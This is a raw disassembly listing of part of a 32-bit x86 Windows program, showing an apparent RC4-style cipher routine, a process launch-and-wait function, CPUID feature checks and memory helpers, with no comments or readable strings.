  4021dd:	c7 44 24 10 00 00 00 	movl   $0x0,0x10(%esp)
  4021e4:	00 
  4021e5:	8b 44 24 0c          	mov    0xc(%esp),%eax
  4021e9:	3b 44 24 10          	cmp    0x10(%esp),%eax
  4021ed:	0f 8c b0 01 00 00    	jl     0x4023a3
  4021f3:	8b 5c 24 10          	mov    0x10(%esp),%ebx
  4021f7:	8b 2d ac b1 40 00    	mov    0x40b1ac,%ebp
  4021fd:	c1 e3 03             	shl    $0x3,%ebx
  402200:	01 dd                	add    %ebx,%ebp
  402202:	8b 55 00             	mov    0x0(%ebp),%edx
  402205:	ff 35 b0 b3 40 00    	push   0x40b3b0
  40220b:	e8 e0 52 00 00       	call   0x4074f0
  402210:	8d 4c 24 18          	lea    0x18(%esp),%ecx
  402214:	5a                   	pop    %edx
  402215:	e8 d6 0e 00 00       	call   0x4030f0
  40221a:	8b 1d 20 b1 40 00    	mov    0x40b120,%ebx
  402220:	83 fb 01             	cmp    $0x1,%ebx
  402223:	74 19                	je     0x40223e
  402225:	ff 74 24 14          	push   0x14(%esp)
  402229:	68 01 00 00 00       	push   $0x1
  40222e:	e8 fd 3f 00 00       	call   0x406230
  402233:	21 c0                	and    %eax,%eax
  402235:	74 07                	je     0x40223e
  402237:	b8 01 00 00 00       	mov    $0x1,%eax
  40223c:	eb 02                	jmp    0x402240
  40223e:	31 c0                	xor    %eax,%eax
  402240:	21 c0                	and    %eax,%eax
  402242:	0f 84 98 00 00 00    	je     0x4022e0
  402248:	68 01 00 00 00       	push   $0x1
  40224d:	e8 7e 3d 00 00       	call   0x405fd0
  402252:	ff 35 b0 b3 40 00    	push   0x40b3b0
  402258:	68 23 00 00 00       	push   $0x23
  40225d:	8b 15 50 b1 40 00    	mov    0x40b150,%edx
  402263:	ff 35 b0 b3 40 00    	push   0x40b3b0
  402269:	e8 82 52 00 00       	call   0x4074f0
  40226e:	ba 11 a0 40 00       	mov    $0x40a011,%edx
  402273:	e8 78 52 00 00       	call   0x4074f0
  402278:	8b 54 24 20          	mov    0x20(%esp),%edx
  40227c:	e8 6f 52 00 00       	call   0x4074f0
  402281:	ba 11 a0 40 00       	mov    $0x40a011,%edx
  402286:	e8 65 52 00 00       	call   0x4074f0
  40228b:	8b 15 54 b1 40 00    	mov    0x40b154,%edx
  402291:	e8 5a 52 00 00       	call   0x4074f0
  402296:	ff 05 b0 b3 40 00    	incl   0x40b3b0
  40229c:	ff 35 4c b1 40 00    	push   0x40b14c
  4022a2:	8b 15 90 a3 40 00    	mov    0x40a390,%edx
  4022a8:	01 54 24 04          	add    %edx,0x4(%esp)
  4022ac:	e8 f1 13 00 00       	call   0x4036a2
  4022b1:	8f 05 b0 b3 40 00    	pop    0x40b3b0
  4022b7:	89 44 24 18          	mov    %eax,0x18(%esp)
  4022bb:	8b 5c 24 18          	mov    0x18(%esp),%ebx
  4022bf:	83 fb 07             	cmp    $0x7,%ebx
  4022c2:	75 07                	jne    0x4022cb
  4022c4:	e9 d1 00 00 00       	jmp    0x40239a
  4022c9:	eb 15                	jmp    0x4022e0
  4022cb:	8b 5c 24 18          	mov    0x18(%esp),%ebx
  4022cf:	83 fb 02             	cmp    $0x2,%ebx
  4022d2:	75 0c                	jne    0x4022e0
  4022d4:	e8 4c fd ff ff       	call   0x402025
  4022d9:	31 c0                	xor    %eax,%eax
  4022db:	e9 9d 01 00 00       	jmp    0x40247d
  4022e0:	ff 74 24 14          	push   0x14(%esp)
  4022e4:	68 01 00 00 00       	push   $0x1
  4022e9:	e8 82 3e 00 00       	call   0x406170
  4022ee:	21 c0                	and    %eax,%eax
  4022f0:	74 7c                	je     0x40236e
  4022f2:	8b 5c 24 10          	mov    0x10(%esp),%ebx
  4022f6:	8b 2d ac b1 40 00    	mov    0x40b1ac,%ebp
  4022fc:	c1 e3 03             	shl    $0x3,%ebx
  4022ff:	01 dd                	add    %ebx,%ebp
  402301:	8b 45 04             	mov    0x4(%ebp),%eax
  402304:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  402308:	ff 74 24 1c          	push   0x1c(%esp)
  40230c:	8b 1d 0c b1 40 00    	mov    0x40b10c,%ebx
  402312:	03 5c 24 24          	add    0x24(%esp),%ebx
  402316:	53                   	push   %ebx
  402317:	68 01 00 00 00       	push   $0x1
  40231c:	e8 af 3f 00 00       	call   0x4062d0
  402321:	68 01 00 00 00       	push   $0x1
  402326:	e8 a5 3c 00 00       	call   0x405fd0
  40232b:	8b 5c 24 20          	mov    0x20(%esp),%ebx
  40232f:	03 5c 24 1c          	add    0x1c(%esp),%ebx
  402333:	89 5c 24 20          	mov    %ebx,0x20(%esp)
  402337:	ff 35 b4 b1 40 00    	push   0x40b1b4
  40233d:	e8 61 1c 00 00       	call   0x403fa3
  402342:	8b 54 24 14          	mov    0x14(%esp),%edx
  402346:	ff 35 b0 b3 40 00    	push   0x40b3b0
  40234c:	e8 9f 51 00 00       	call   0x4074f0
  402351:	8b 2d b8 b1 40 00    	mov    0x40b1b8,%ebp
  402357:	8d 4d 08             	lea    0x8(%ebp),%ecx
  40235a:	5a                   	pop    %edx
  40235b:	e8 90 0d 00 00       	call   0x4030f0
  402360:	ff 74 24 14          	push   0x14(%esp)
  402364:	e8 f7 45 00 00       	call   0x406960
  402369:	89 45 0c             	mov    %eax,0xc(%ebp)
  40236c:	eb 2c                	jmp    0x40239a
  40236e:	8b 54 24 24          	mov    0x24(%esp),%edx
  402372:	ff 35 b0 b3 40 00    	push   0x40b3b0
  402378:	e8 73 51 00 00       	call   0x4074f0
  40237d:	8b 54 24 18          	mov    0x18(%esp),%edx
  402381:	e8 6a 51 00 00       	call   0x4074f0
  402386:	ba 9b a1 40 00       	mov    $0x40a19b,%edx
  40238b:	e8 60 51 00 00       	call   0x4074f0
  402390:	8d 4c 24 28          	lea    0x28(%esp),%ecx
  402394:	5a                   	pop    %edx
  402395:	e8 56 0d 00 00       	call   0x4030f0
  40239a:	ff 44 24 10          	incl   0x10(%esp)
  40239e:	e9 42 fe ff ff       	jmp    0x4021e5
  4023a3:	a1 b0 b3 40 00       	mov    0x40b3b0,%eax
  4023a8:	50                   	push   %eax
  4023a9:	50                   	push   %eax
  4023aa:	a1 b0 b3 40 00       	mov    0x40b3b0,%eax
  4023af:	50                   	push   %eax
  4023b0:	50                   	push   %eax
  4023b1:	ff 35 b0 b3 40 00    	push   0x40b3b0
  4023b7:	68 9b a1 40 00       	push   $0x40a19b
  4023bc:	ff 74 24 3c          	push   0x3c(%esp)
  4023c0:	e8 0b 12 00 00       	call   0x4035d0
  4023c5:	ff 05 b0 b3 40 00    	incl   0x40b3b0
  4023cb:	8b 15 90 a3 40 00    	mov    0x40a390,%edx
  4023d1:	01 14 24             	add    %edx,(%esp)
  4023d4:	e8 17 12 00 00       	call   0x4035f0
  4023d9:	ff 05 b0 b3 40 00    	incl   0x40b3b0
  4023df:	8b 15 90 a3 40 00    	mov    0x40a390,%edx
  4023e5:	01 14 24             	add    %edx,(%esp)
  4023e8:	e8 03 0e 00 00       	call   0x4031f0
  4023ed:	8f 05 b0 b3 40 00    	pop    0x40b3b0
  4023f3:	89 c3                	mov    %eax,%ebx
  4023f5:	21 db                	and    %ebx,%ebx
  4023f7:	7e 7b                	jle    0x402474
  4023f9:	ff 35 b0 b3 40 00    	push   0x40b3b0
  4023ff:	68 24 00 00 00       	push   $0x24
  402404:	8b 15 40 b1 40 00    	mov    0x40b140,%edx
  40240a:	ff 35 b0 b3 40 00    	push   0x40b3b0
  402410:	e8 db 50 00 00       	call   0x4074f0
  402415:	ba 3c a3 40 00       	mov    $0x40a33c,%edx
  40241a:	e8 d1 50 00 00       	call   0x4074f0
  40241f:	8b 54 24 30          	mov    0x30(%esp),%edx
  402423:	e8 c8 50 00 00       	call   0x4074f0
  402428:	ba 9b a1 40 00       	mov    $0x40a19b,%edx
  40242d:	e8 be 50 00 00       	call   0x4074f0
  402432:	8b 15 38 b1 40 00    	mov    0x40b138,%edx
  402438:	e8 b3 50 00 00       	call   0x4074f0
  40243d:	ff 05 b0 b3 40 00    	incl   0x40b3b0
  402443:	ff 35 3c b1 40 00    	push   0x40b13c
  402449:	8b 15 90 a3 40 00    	mov    0x40a390,%edx
  40244f:	01 54 24 04          	add    %edx,0x4(%esp)
  402453:	e8 4a 12 00 00       	call   0x4036a2
  402458:	8f 05 b0 b3 40 00    	pop    0x40b3b0
  40245e:	89 44 24 18          	mov    %eax,0x18(%esp)
  402462:	8b 5c 24 18          	mov    0x18(%esp),%ebx
  402466:	83 fb 07             	cmp    $0x7,%ebx
  402469:	75 09                	jne    0x402474
  40246b:	e8 b5 fb ff ff       	call   0x402025
  402470:	31 c0                	xor    %eax,%eax
  402472:	eb 09                	jmp    0x40247d
  402474:	b8 01 00 00 00       	mov    $0x1,%eax
  402479:	eb 02                	jmp    0x40247d
  40247b:	31 c0                	xor    %eax,%eax
  40247d:	ff 34 24             	push   (%esp)
  402480:	e8 cb 50 00 00       	call   0x407550
  402485:	ff 74 24 08          	push   0x8(%esp)
  402489:	e8 c2 50 00 00       	call   0x407550
  40248e:	ff 74 24 14          	push   0x14(%esp)
  402492:	e8 b9 50 00 00       	call   0x407550
  402497:	ff 74 24 24          	push   0x24(%esp)
  40249b:	e8 b0 50 00 00       	call   0x407550
  4024a0:	83 c4 28             	add    $0x28,%esp
  4024a3:	5b                   	pop    %ebx
  4024a4:	5d                   	pop    %ebp
  4024a5:	c2 04 00             	ret    $0x4
  4024a8:	55                   	push   %ebp
  4024a9:	53                   	push   %ebx
  4024aa:	57                   	push   %edi
  4024ab:	ba 0f 00 00 00       	mov    $0xf,%edx
  4024b0:	83 ec 04             	sub    $0x4,%esp
  4024b3:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  4024ba:	4a                   	dec    %edx
  4024bb:	75 f3                	jne    0x4024b0
  4024bd:	8b 54 24 54          	mov    0x54(%esp),%edx
  4024c1:	8d 0c 24             	lea    (%esp),%ecx
  4024c4:	e8 37 0c 00 00       	call   0x403100
  4024c9:	68 05 00 00 00       	push   $0x5
  4024ce:	8d 54 24 08          	lea    0x8(%esp),%edx
  4024d2:	52                   	push   %edx
  4024d3:	68 00 00 00 00       	push   $0x0
  4024d8:	8b 54 24 10          	mov    0x10(%esp),%edx
  4024dc:	e8 2f 0c 00 00       	call   0x403110
  4024e1:	b8 00 01 00 00       	mov    $0x100,%eax
  4024e6:	68 04 00 00 00       	push   $0x4
  4024eb:	e8 b0 0b 00 00       	call   0x4030a0
  4024f0:	68 05 00 00 00       	push   $0x5
  4024f5:	8d 54 24 10          	lea    0x10(%esp),%edx
  4024f9:	52                   	push   %edx
  4024fa:	68 00 00 00 00       	push   $0x0
  4024ff:	8b 54 24 18          	mov    0x18(%esp),%edx
  402503:	e8 08 0c 00 00       	call   0x403110
  402508:	b8 00 01 00 00       	mov    $0x100,%eax
  40250d:	68 04 00 00 00       	push   $0x4
  402512:	e8 89 0b 00 00       	call   0x4030a0
  402517:	c7 44 24 14 00 00 00 	movl   $0x0,0x14(%esp)
  40251e:	00 
  40251f:	c7 44 24 18 00 00 00 	movl   $0x0,0x18(%esp)
  402526:	00 
  402527:	c7 44 24 1c 00 00 00 	movl   $0x0,0x1c(%esp)
  40252e:	00 
  40252f:	c7 44 24 20 00 00 00 	movl   $0x0,0x20(%esp)
  402536:	00 
  402537:	c7 44 24 24 00 00 00 	movl   $0x0,0x24(%esp)
  40253e:	00 
  40253f:	c7 44 24 28 00 00 00 	movl   $0x0,0x28(%esp)
  402546:	00 
  402547:	c7 44 24 18 01 00 00 	movl   $0x1,0x18(%esp)
  40254e:	00 
  40254f:	ff 34 24             	push   (%esp)
  402552:	e8 99 0c 00 00       	call   0x4031f0
  402557:	89 44 24 2c          	mov    %eax,0x2c(%esp)
  40255b:	8b 44 24 04          	mov    0x4(%esp),%eax
  40255f:	89 44 24 30          	mov    %eax,0x30(%esp)
  402563:	8b 04 24             	mov    (%esp),%eax
  402566:	89 44 24 34          	mov    %eax,0x34(%esp)
  40256a:	c7 44 24 14 00 00 00 	movl   $0x0,0x14(%esp)
  402571:	00 
  402572:	b8 ff 00 00 00       	mov    $0xff,%eax
  402577:	3b 44 24 14          	cmp    0x14(%esp),%eax
  40257b:	7c 46                	jl     0x4025c3
  40257d:	ff 74 24 14          	push   0x14(%esp)
  402581:	8b 6c 24 34          	mov    0x34(%esp),%ebp
  402585:	8f 45 00             	pop    0x0(%ebp)
  402588:	83 44 24 30 04       	addl   $0x4,0x30(%esp)
  40258d:	8b 6c 24 34          	mov    0x34(%esp),%ebp
  402591:	0f be 5d 00          	movsbl 0x0(%ebp),%ebx
  402595:	21 db                	and    %ebx,%ebx
  402597:	75 07                	jne    0x4025a0
  402599:	8b 04 24             	mov    (%esp),%eax
  40259c:	89 44 24 34          	mov    %eax,0x34(%esp)
  4025a0:	8b 6c 24 34          	mov    0x34(%esp),%ebp
  4025a4:	0f be 45 00          	movsbl 0x0(%ebp),%eax
  4025a8:	50                   	push   %eax
  4025a9:	8b 5c 24 18          	mov    0x18(%esp),%ebx
  4025ad:	8b 6c 24 10          	mov    0x10(%esp),%ebp
  4025b1:	c1 e3 02             	shl    $0x2,%ebx
  4025b4:	58                   	pop    %eax
  4025b5:	89 44 1d 00          	mov    %eax,0x0(%ebp,%ebx,1)
  4025b9:	ff 44 24 34          	incl   0x34(%esp)
  4025bd:	ff 44 24 14          	incl   0x14(%esp)
  4025c1:	eb af                	jmp    0x402572
  4025c3:	c7 44 24 18 00 00 00 	movl   $0x0,0x18(%esp)
  4025ca:	00 
  4025cb:	c7 44 24 14 00 00 00 	movl   $0x0,0x14(%esp)
  4025d2:	00 
  4025d3:	b8 ff 00 00 00       	mov    $0xff,%eax
  4025d8:	3b 44 24 14          	cmp    0x14(%esp),%eax
  4025dc:	7c 6c                	jl     0x40264a
  4025de:	8b 5c 24 18          	mov    0x18(%esp),%ebx
  4025e2:	8b 7c 24 14          	mov    0x14(%esp),%edi
  4025e6:	8b 6c 24 04          	mov    0x4(%esp),%ebp
  4025ea:	c1 e7 02             	shl    $0x2,%edi
  4025ed:	03 5c 3d 00          	add    0x0(%ebp,%edi,1),%ebx
  4025f1:	8b 7c 24 14          	mov    0x14(%esp),%edi
  4025f5:	8b 6c 24 0c          	mov    0xc(%esp),%ebp
  4025f9:	c1 e7 02             	shl    $0x2,%edi
  4025fc:	03 5c 3d 00          	add    0x0(%ebp,%edi,1),%ebx
  402600:	81 e3 ff 00 00 00    	and    $0xff,%ebx
  402606:	89 5c 24 18          	mov    %ebx,0x18(%esp)
  40260a:	8b 5c 24 14          	mov    0x14(%esp),%ebx
  40260e:	8b 6c 24 04          	mov    0x4(%esp),%ebp
  402612:	c1 e3 02             	shl    $0x2,%ebx
  402615:	8b 44 1d 00          	mov    0x0(%ebp,%ebx,1),%eax
  402619:	89 44 24 24          	mov    %eax,0x24(%esp)
  40261d:	8b 5c 24 18          	mov    0x18(%esp),%ebx
  402621:	c1 e3 02             	shl    $0x2,%ebx
  402624:	ff 74 1d 00          	push   0x0(%ebp,%ebx,1)
  402628:	8b 5c 24 18          	mov    0x18(%esp),%ebx
  40262c:	c1 e3 02             	shl    $0x2,%ebx
  40262f:	58                   	pop    %eax
  402630:	89 44 1d 00          	mov    %eax,0x0(%ebp,%ebx,1)
  402634:	ff 74 24 24          	push   0x24(%esp)
  402638:	8b 5c 24 1c          	mov    0x1c(%esp),%ebx
  40263c:	c1 e3 02             	shl    $0x2,%ebx
  40263f:	58                   	pop    %eax
  402640:	89 44 1d 00          	mov    %eax,0x0(%ebp,%ebx,1)
  402644:	ff 44 24 14          	incl   0x14(%esp)
  402648:	eb 89                	jmp    0x4025d3
  40264a:	c7 44 24 14 00 00 00 	movl   $0x0,0x14(%esp)
  402651:	00 
  402652:	c7 44 24 18 00 00 00 	movl   $0x0,0x18(%esp)
  402659:	00 
  40265a:	8b 44 24 4c          	mov    0x4c(%esp),%eax
  40265e:	89 44 24 38          	mov    %eax,0x38(%esp)
  402662:	c7 44 24 20 00 00 00 	movl   $0x0,0x20(%esp)
  402669:	00 
  40266a:	8b 5c 24 50          	mov    0x50(%esp),%ebx
  40266e:	4b                   	dec    %ebx
  40266f:	3b 5c 24 20          	cmp    0x20(%esp),%ebx
  402673:	0f 8c bb 00 00 00    	jl     0x402734
  402679:	8b 5c 24 14          	mov    0x14(%esp),%ebx
  40267d:	43                   	inc    %ebx
  40267e:	81 e3 ff 00 00 00    	and    $0xff,%ebx
  402684:	89 5c 24 14          	mov    %ebx,0x14(%esp)
  402688:	8b 5c 24 18          	mov    0x18(%esp),%ebx
  40268c:	8b 7c 24 14          	mov    0x14(%esp),%edi
  402690:	8b 6c 24 04          	mov    0x4(%esp),%ebp
  402694:	c1 e7 02             	shl    $0x2,%edi
  402697:	03 5c 3d 00          	add    0x0(%ebp,%edi,1),%ebx
  40269b:	81 e3 ff 00 00 00    	and    $0xff,%ebx
  4026a1:	89 5c 24 18          	mov    %ebx,0x18(%esp)
  4026a5:	8b 5c 24 14          	mov    0x14(%esp),%ebx
  4026a9:	c1 e3 02             	shl    $0x2,%ebx
  4026ac:	8b 44 1d 00          	mov    0x0(%ebp,%ebx,1),%eax
  4026b0:	89 44 24 24          	mov    %eax,0x24(%esp)
  4026b4:	8b 5c 24 18          	mov    0x18(%esp),%ebx
  4026b8:	c1 e3 02             	shl    $0x2,%ebx
  4026bb:	ff 74 1d 00          	push   0x0(%ebp,%ebx,1)
  4026bf:	8b 5c 24 18          	mov    0x18(%esp),%ebx
  4026c3:	c1 e3 02             	shl    $0x2,%ebx
  4026c6:	58                   	pop    %eax
  4026c7:	89 44 1d 00          	mov    %eax,0x0(%ebp,%ebx,1)
  4026cb:	ff 74 24 24          	push   0x24(%esp)
  4026cf:	8b 5c 24 1c          	mov    0x1c(%esp),%ebx
  4026d3:	c1 e3 02             	shl    $0x2,%ebx
  4026d6:	58                   	pop    %eax
  4026d7:	89 44 1d 00          	mov    %eax,0x0(%ebp,%ebx,1)
  4026db:	8b 5c 24 14          	mov    0x14(%esp),%ebx
  4026df:	c1 e3 02             	shl    $0x2,%ebx
  4026e2:	8b 5c 1d 00          	mov    0x0(%ebp,%ebx,1),%ebx
  4026e6:	8b 7c 24 18          	mov    0x18(%esp),%edi
  4026ea:	c1 e7 02             	shl    $0x2,%edi
  4026ed:	8b 7c 3d 00          	mov    0x0(%ebp,%edi,1),%edi
  4026f1:	81 e7 ff 00 00 00    	and    $0xff,%edi
  4026f7:	01 fb                	add    %edi,%ebx
  4026f9:	81 e3 ff 00 00 00    	and    $0xff,%ebx
  4026ff:	89 5c 24 1c          	mov    %ebx,0x1c(%esp)
  402703:	8b 5c 24 1c          	mov    0x1c(%esp),%ebx
  402707:	c1 e3 02             	shl    $0x2,%ebx
  40270a:	8b 44 1d 00          	mov    0x0(%ebp,%ebx,1),%eax
  40270e:	89 44 24 28          	mov    %eax,0x28(%esp)
  402712:	8b 6c 24 38          	mov    0x38(%esp),%ebp
  402716:	0f be 5d 00          	movsbl 0x0(%ebp),%ebx
  40271a:	33 5c 24 28          	xor    0x28(%esp),%ebx
  40271e:	53                   	push   %ebx
  40271f:	8b 6c 24 3c          	mov    0x3c(%esp),%ebp
  402723:	58                   	pop    %eax
  402724:	88 45 00             	mov    %al,0x0(%ebp)
  402727:	ff 44 24 38          	incl   0x38(%esp)
  40272b:	ff 44 24 20          	incl   0x20(%esp)
  40272f:	e9 36 ff ff ff       	jmp    0x40266a
  402734:	8b 44 24 4c          	mov    0x4c(%esp),%eax
  402738:	eb 02                	jmp    0x40273c
  40273a:	31 c0                	xor    %eax,%eax
  40273c:	ff 34 24             	push   (%esp)
  40273f:	e8 0c 4e 00 00       	call   0x407550
  402744:	50                   	push   %eax
  402745:	8b 54 24 08          	mov    0x8(%esp),%edx
  402749:	e8 c2 09 00 00       	call   0x403110
  40274e:	8b 54 24 10          	mov    0x10(%esp),%edx
  402752:	e8 b9 09 00 00       	call   0x403110
  402757:	58                   	pop    %eax
  402758:	83 c4 3c             	add    $0x3c,%esp
  40275b:	5f                   	pop    %edi
  40275c:	5b                   	pop    %ebx
  40275d:	5d                   	pop    %ebp
  40275e:	c2 0c 00             	ret    $0xc
  402761:	55                   	push   %ebp
  402762:	53                   	push   %ebx
  402763:	ba 14 00 00 00       	mov    $0x14,%edx
  402768:	83 ec 04             	sub    $0x4,%esp
  40276b:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  402772:	4a                   	dec    %edx
  402773:	75 f3                	jne    0x402768
  402775:	8b 54 24 5c          	mov    0x5c(%esp),%edx
  402779:	8d 0c 24             	lea    (%esp),%ecx
  40277c:	e8 7f 09 00 00       	call   0x403100
  402781:	8b 54 24 60          	mov    0x60(%esp),%edx
  402785:	8d 4c 24 04          	lea    0x4(%esp),%ecx
  402789:	e8 72 09 00 00       	call   0x403100
  40278e:	8b 54 24 64          	mov    0x64(%esp),%edx
  402792:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  402796:	e8 65 09 00 00       	call   0x403100
  40279b:	8d 44 24 0c          	lea    0xc(%esp),%eax
  40279f:	8d 6c 24 0c          	lea    0xc(%esp),%ebp
  4027a3:	c7 45 00 3c 00 00 00 	movl   $0x3c,0x0(%ebp)
  4027aa:	c7 45 04 40 01 00 00 	movl   $0x140,0x4(%ebp)
  4027b1:	c7 45 1c 00 00 00 00 	movl   $0x0,0x1c(%ebp)
  4027b8:	b8 0e a1 40 00       	mov    $0x40a10e,%eax
  4027bd:	89 45 0c             	mov    %eax,0xc(%ebp)
  4027c0:	8b 04 24             	mov    (%esp),%eax
  4027c3:	89 45 10             	mov    %eax,0x10(%ebp)
  4027c6:	8b 44 24 08          	mov    0x8(%esp),%eax
  4027ca:	89 45 14             	mov    %eax,0x14(%ebp)
  4027cd:	8b 44 24 04          	mov    0x4(%esp),%eax
  4027d1:	89 45 18             	mov    %eax,0x18(%ebp)
  4027d4:	8d 44 24 0c          	lea    0xc(%esp),%eax
  4027d8:	50                   	push   %eax
  4027d9:	e8 2d 58 00 00       	call   0x40800b
  4027de:	89 44 24 48          	mov    %eax,0x48(%esp)
  4027e2:	68 19 00 00 00       	push   $0x19
  4027e7:	e8 98 15 00 00       	call   0x403d84
  4027ec:	8d 44 24 4c          	lea    0x4c(%esp),%eax
  4027f0:	50                   	push   %eax
  4027f1:	8d 6c 24 10          	lea    0x10(%esp),%ebp
  4027f5:	ff 75 38             	push   0x38(%ebp)
  4027f8:	e8 e1 09 00 00       	call   0x4031de
  4027fd:	21 c0                	and    %eax,%eax
  4027ff:	74 0e                	je     0x40280f
  402801:	8b 5c 24 4c          	mov    0x4c(%esp),%ebx
  402805:	81 fb 03 01 00 00    	cmp    $0x103,%ebx
  40280b:	74 02                	je     0x40280f
  40280d:	eb 02                	jmp    0x402811
  40280f:	eb d1                	jmp    0x4027e2
  402811:	b8 01 00 00 00       	mov    $0x1,%eax
  402816:	eb 02                	jmp    0x40281a
  402818:	31 c0                	xor    %eax,%eax
  40281a:	ff 34 24             	push   (%esp)
  40281d:	e8 2e 4d 00 00       	call   0x407550
  402822:	ff 74 24 04          	push   0x4(%esp)
  402826:	e8 25 4d 00 00       	call   0x407550
  40282b:	ff 74 24 08          	push   0x8(%esp)
  40282f:	e8 1c 4d 00 00       	call   0x407550
  402834:	83 c4 50             	add    $0x50,%esp
  402837:	5b                   	pop    %ebx
  402838:	5d                   	pop    %ebp
  402839:	c2 0c 00             	ret    $0xc
	...
  403000:	bd 00 00 00 00       	mov    $0x0,%ebp
  403005:	9c                   	pushf
  403006:	58                   	pop    %eax
  403007:	bd 00 00 00 00       	mov    $0x0,%ebp
  40300c:	89 c1                	mov    %eax,%ecx
  40300e:	35 00 00 20 00       	xor    $0x200000,%eax
  403013:	50                   	push   %eax
  403014:	9d                   	popf
  403015:	9c                   	pushf
  403016:	58                   	pop    %eax
  403017:	31 c8                	xor    %ecx,%eax
  403019:	74 3e                	je     0x403059
  40301b:	b8 01 00 00 00       	mov    $0x1,%eax
  403020:	0f a2                	cpuid
  403022:	89 d0                	mov    %edx,%eax
  403024:	25 00 00 80 00       	and    $0x800000,%eax
  403029:	74 2e                	je     0x403059
  40302b:	83 cd 02             	or     $0x2,%ebp
  40302e:	89 d0                	mov    %edx,%eax
  403030:	25 00 00 00 02       	and    $0x2000000,%eax
  403035:	74 0f                	je     0x403046
  403037:	83 cd 08             	or     $0x8,%ebp
  40303a:	89 d0                	mov    %edx,%eax
  40303c:	25 00 00 00 04       	and    $0x4000000,%eax
  403041:	74 03                	je     0x403046
  403043:	83 cd 10             	or     $0x10,%ebp
  403046:	b8 01 00 00 80       	mov    $0x80000001,%eax
  40304b:	0f a2                	cpuid
  40304d:	89 d0                	mov    %edx,%eax
  40304f:	25 00 00 00 80       	and    $0x80000000,%eax
  403054:	74 03                	je     0x403059
  403056:	83 cd 04             	or     $0x4,%ebp
  403059:	89 e8                	mov    %ebp,%eax
  40305b:	c3                   	ret
  40305c:	cc                   	int3
  40305d:	cc                   	int3
  40305e:	cc                   	int3
  40305f:	cc                   	int3
  403060:	50                   	push   %eax
  403061:	09 d2                	or     %edx,%edx
  403063:	74 31                	je     0x403096
  403065:	83 ea 18             	sub    $0x18,%edx
  403068:	52                   	push   %edx
  403069:	56                   	push   %esi
  40306a:	57                   	push   %edi
  40306b:	8b 42 08             	mov    0x8(%edx),%eax
  40306e:	8b 72 10             	mov    0x10(%edx),%esi
  403071:	8b 7a 04             	mov    0x4(%edx),%edi
  403074:	83 c2 18             	add    $0x18,%edx
  403077:	52                   	push   %edx
  403078:	50                   	push   %eax
  403079:	50                   	push   %eax
  40307a:	52                   	push   %edx
  40307b:	e8 a8 00 00 00       	call   0x403128
  403080:	58                   	pop    %eax
  403081:	5a                   	pop    %edx
  403082:	01 fa                	add    %edi,%edx
  403084:	4e                   	dec    %esi
  403085:	75 f0                	jne    0x403077
  403087:	5f                   	pop    %edi
  403088:	5e                   	pop    %esi
  403089:	6a 00                	push   $0x0
  40308b:	ff 35 f8 b0 40 00    	push   0x40b0f8
  403091:	e8 4e 01 00 00       	call   0x4031e4
  403096:	58                   	pop    %eax
  403097:	c3                   	ret
  403098:	cc                   	int3
  403099:	cc                   	int3
  40309a:	cc                   	int3
  40309b:	cc                   	int3
  40309c:	cc                   	int3
  40309d:	cc                   	int3
  40309e:	cc                   	int3
  40309f:	cc                   	int3
  4030a0:	50                   	push   %eax
  4030a1:	8b 54 24 08          	mov    0x8(%esp),%edx
  4030a5:	40                   	inc    %eax
  4030a6:	0f af d0             	imul   %eax,%edx
  4030a9:	83 c2 18             	add    $0x18,%edx
  4030ac:	52                   	push   %edx
  4030ad:	6a 08                	push   $0x8
  4030af:	ff 35 f8 b0 40 00    	push   0x40b0f8
  4030b5:	e8 30 01 00 00       	call   0x4031ea
  4030ba:	5a                   	pop    %edx
  4030bb:	09 c0                	or     %eax,%eax
  4030bd:	74 28                	je     0x4030e7
  4030bf:	89 50 10             	mov    %edx,0x10(%eax)
  4030c2:	8b 54 24 04          	mov    0x4(%esp),%edx
  4030c6:	89 50 04             	mov    %edx,0x4(%eax)
  4030c9:	8b 54 24 08          	mov    0x8(%esp),%edx
  4030cd:	89 50 08             	mov    %edx,0x8(%eax)
  4030d0:	8b 54 24 0c          	mov    0xc(%esp),%edx
  4030d4:	89 50 0c             	mov    %edx,0xc(%eax)
  4030d7:	8b 54 24 10          	mov    0x10(%esp),%edx
  4030db:	89 50 14             	mov    %edx,0x14(%eax)
  4030de:	c7 00 01 00 00 00    	movl   $0x1,(%eax)
  4030e4:	83 c0 18             	add    $0x18,%eax
  4030e7:	8b 54 24 0c          	mov    0xc(%esp),%edx
  4030eb:	89 02                	mov    %eax,(%edx)
  4030ed:	c2 10 00             	ret    $0x10
  4030f0:	52                   	push   %edx
  4030f1:	51                   	push   %ecx
  4030f2:	e8 89 44 00 00       	call   0x407580
  4030f7:	c3                   	ret
  4030f8:	cc                   	int3
  4030f9:	cc                   	int3
  4030fa:	cc                   	int3
  4030fb:	cc                   	int3
  4030fc:	cc                   	int3
  4030fd:	cc                   	int3
  4030fe:	cc                   	int3
  4030ff:	cc                   	int3
  403100:	52                   	push   %edx
  403101:	51                   	push   %ecx
  403102:	e8 f9 44 00 00       	call   0x407600
  403107:	c3                   	ret
  403108:	52                   	push   %edx
  403109:	51                   	push   %ecx
  40310a:	e8 41 45 00 00       	call   0x407650
  40310f:	c3                   	ret
  403110:	50                   	push   %eax
  403111:	09 d2                	or     %edx,%edx
  403113:	74 11                	je     0x403126
  403115:	83 ea 18             	sub    $0x18,%edx
  403118:	52                   	push   %edx
  403119:	6a 00                	push   $0x0
  40311b:	ff 35 f8 b0 40 00    	push   0x40b0f8
  403121:	e8 be 00 00 00       	call   0x4031e4
  403126:	58                   	pop    %eax
  403127:	c3                   	ret
  403128:	55                   	push   %ebp
  403129:	8b ec                	mov    %esp,%ebp
  40312b:	53                   	push   %ebx
  40312c:	56                   	push   %esi
  40312d:	57                   	push   %edi
  40312e:	50                   	push   %eax
  40312f:	8b 75 0c             	mov    0xc(%ebp),%esi
  403132:	8b 06                	mov    (%esi),%eax
  403134:	83 f8 ff             	cmp    $0xffffffff,%eax
  403137:	74 4f                	je     0x403188
  403139:	8b 5d 08             	mov    0x8(%ebp),%ebx
  40313c:	83 f8 fe             	cmp    $0xfffffffe,%eax
  40313f:	75 26                	jne    0x403167
  403141:	33 ff                	xor    %edi,%edi
  403143:	39 7e 04             	cmp    %edi,0x4(%esi)
  403146:	7e 1a                	jle    0x403162
  403148:	8b 46 0c             	mov    0xc(%esi),%eax
  40314b:	ff 76 10             	push   0x10(%esi)
  40314e:	0f af c7             	imul   %edi,%eax
